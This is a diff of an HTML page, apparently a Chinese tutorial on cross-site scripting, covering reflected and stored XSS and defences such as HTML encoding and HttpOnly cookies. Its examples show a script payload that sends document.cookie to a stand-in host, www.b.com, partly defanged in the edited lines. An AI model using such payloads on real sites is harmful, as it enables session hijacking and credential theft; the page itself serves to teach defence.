@@ -33,9 +33,11 @@
         <p>
          假设某一使用cookie的网站http://www.a.com上有一个链接，链接是由通过某一变量content与字符串组装起来的，在用户已经登陆的情况下，只要在浏览器的网址栏中输入
         </p>
-        <code>
-        http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>， 
+       <pre>
+          <code>
+          http://www.a.com?content=<script>window@open(“www.b.com?param=”+document@cookie)</script>， 
         </code>
+       </pre>
         <p>
         cookie中存有的登录密码就可能被盗取。
         </p>
@@ -46,9 +48,11 @@
         <p>
          假设一个网站http://www.a.com可以输入内容并存储到服务器，我在input框中输入恶意代码
         </p>
-        <code>
-        <script>window.open(“www.b.com?param=”+document.cookie)</script>
-        </code>
+        <pre>
+          <code>
+          <scr-ipt>window@open(“www.b.com?param=”+document@cookie)</scr-ipt>
+          </code>
+        </pre>
         <p>
         并成功地保存到服务器之后，一旦有人访问了我发布的内容，该代码就会执行，用户的cookie数据就会被发送到我自己的服务器www.b.com， 对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码。
         </p>
@@ -59,7 +63,7 @@
       
        <ol>
         <li>
-        输入过滤，html encode 将特殊字符转码，如<code><</code>要转换成<code>&lt;</code>， 务必保证用户输入的东西是文本而不是一段可执行的代码。
+        输入过滤，html encode 将特殊字符转码，如<code><</code>要转换成<code>"&lt;"</code>， 务必保证用户输入的东西是文本而不是一段可执行的代码。
         </li>
         <li>
         限制输入
@@ -69,7 +73,11 @@
         </li>
         <li>
         HttpOnly防止劫取Cookie
-        <code>header("Set-Cookie: cookie2=test2;httponly",false);</code>
+       <pre>
+          <code>
+            header("Set-Cookie: cookie2=test2;httponly",false);
+          </code>
+       </pre>
         </li>
       </ol>
       <p>
